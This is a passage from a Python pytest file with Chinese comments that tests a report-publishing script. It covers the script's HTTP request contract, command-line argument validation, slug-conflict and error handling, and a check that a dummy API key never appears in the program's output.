    assert call["payload"]["expect"] == "revision"
    assert call["payload"]["version_label"] == "v2-修订"


# ---- send_request 本身的线上契约（唯一接触网络的函数，必须直接测）----

def test_send_request_wire_contract(monkeypatch):
    import publish_strategy_report as mod
    captured = {}

    def fake_request(method, url, **kw):
        captured["method"] = method
        captured["url"] = url
        captured["kw"] = kw
        return Resp(200, {"success": True})

    monkeypatch.setattr(requests, "request", fake_request)
    payload = {"slug": "ops-x", "content_html": "<p>x</p>"}
    mod.send_request(DEFAULT_URL, "sk-strategy-secret", payload)

    assert captured["method"] == "POST"
    assert captured["url"] == DEFAULT_URL
    assert captured["kw"]["json"] is payload            # payload 走 json= 而非 data=
    assert captured["kw"]["timeout"] == 30
    assert captured["kw"]["headers"]["Authorization"] == "Bearer sk-strategy-secret"
    assert captured["kw"]["headers"]["Content-Type"].startswith("application/json")


# ---- --update 漏传 --version-label：会静默清空库里已有标签，客户端直接拒绝 ----

def test_update_without_version_label_is_rejected_without_request(monkeypatch, tmp_path, capsys):
    mod, p, sender = _install(monkeypatch, tmp_path)
    with pytest.raises(SystemExit) as exc:
        _run(mod, monkeypatch, p, "--update")
    assert exc.value.code == 2
    assert "--version-label" in capsys.readouterr().err
    assert sender.calls == []


# ---- --generated-at 必填：漏了会让页头「生成于」显示推送时间且重发就漂 ----

def test_generated_at_is_required(monkeypatch, tmp_path, capsys):
    mod, p, sender = _install(monkeypatch, tmp_path)
    argv = ["publish_strategy_report.py", "--html", str(p),
            "--slug", "ops-diagnosis-202607", "--title", "运营数据诊断报告（2026-07）"]
    with pytest.raises(SystemExit) as exc:
        _run_argv(mod, monkeypatch, argv)
    assert exc.value.code == 2
    err = capsys.readouterr().err
    assert "required" in err and "--generated-at" in err
    assert sender.calls == []


# ---- 200 但 created 与 expect 不符：契约破了，非零退出 ----

def test_created_mismatching_expect_is_failure(monkeypatch, tmp_path, capsys):
    mod, p, sender = _install(monkeypatch, tmp_path,
                              resp=Resp(200, {"success": True, "data": {"id": 12, "created": False}}))
    with pytest.raises(SystemExit) as exc:
        _run(mod, monkeypatch, p)          # 未传 --update，却被告知 created=False
    assert exc.value.code != 0
    cap = capsys.readouterr()
    assert json.loads(cap.out.strip().splitlines()[-1])["outcome"] == "failed"
    assert "契约异常" in cap.err


# ---- 409 slug_conflict 两个方向 ----

def test_conflict_new_but_slug_exists(monkeypatch, tmp_path, capsys):
    mod, p, sender = _install(monkeypatch, tmp_path,
                              resp=Resp(409, {"success": False, "error": "slug 已存在",
                                              "code": "slug_conflict"}))
    with pytest.raises(SystemExit) as exc:
        _run(mod, monkeypatch, p)
    assert exc.value.code != 0
    cap = capsys.readouterr()
    assert json.loads(cap.out.strip().splitlines()[-1])["outcome"] == "conflict"
    assert "未写库" in cap.err and "--update" in cap.err


def test_conflict_update_but_slug_absent(monkeypatch, tmp_path, capsys):
    mod, p, sender = _install(monkeypatch, tmp_path,
                              resp=Resp(409, {"success": False, "error": "slug 不存在",
                                              "code": "slug_conflict"}))
    with pytest.raises(SystemExit) as exc:
        _run(mod, monkeypatch, p, "--update", "--version-label", "v2-修订")
    assert exc.value.code != 0
    cap = capsys.readouterr()
    assert json.loads(cap.out.strip().splitlines()[-1])["outcome"] == "conflict"
    assert "未写库" in cap.err and "不存在" in cap.err


# ---- 其它失败：403 / 网络异常 ----

def test_403_is_failed(monkeypatch, tmp_path, capsys):
    mod, p, sender = _install(monkeypatch, tmp_path,
                              resp=Resp(403, {"success": False, "error": "缺 strategy:write"}))
    with pytest.raises(SystemExit) as exc:
        _run(mod, monkeypatch, p)
    assert exc.value.code != 0
    cap = capsys.readouterr()
    assert json.loads(cap.out.strip().splitlines()[-1])["outcome"] == "failed"
    assert "strategy:write" in cap.err


def test_network_exception_is_failed(monkeypatch, tmp_path, capsys):
    import publish_strategy_report as mod
    p = tmp_path / "报告-artifact版.html"
    p.write_text(FRAGMENT, encoding="utf-8")
    monkeypatch.setattr(mod.nbdpsy_common, "get_secret", lambda k: "sk-strategy-secret")

    def boom(url, key, payload):
        raise requests.ConnectionError("boom")
    monkeypatch.setattr(mod, "send_request", boom)
    with pytest.raises(SystemExit) as exc:
        _run(mod, monkeypatch, p)
    assert exc.value.code != 0
    cap = capsys.readouterr()
    assert json.loads(cap.out.strip().splitlines()[-1])["outcome"] == "failed"
    assert "sk-strategy-secret" not in cap.out + cap.err


# ---- key 绝不落日志（成功路径全量输出扫描）----

def test_key_never_appears_in_output(monkeypatch, tmp_path, capsys):
    mod, p, sender = _install(monkeypatch, tmp_path, key="sk-strategy-secret")
    _run(mod, monkeypatch, p)
    cap = capsys.readouterr()
    assert "sk-strategy-secret" not in cap.out + cap.err
    assert sender.calls[0]["key"] == "sk-strategy-secret"   # key 确实传给了请求层
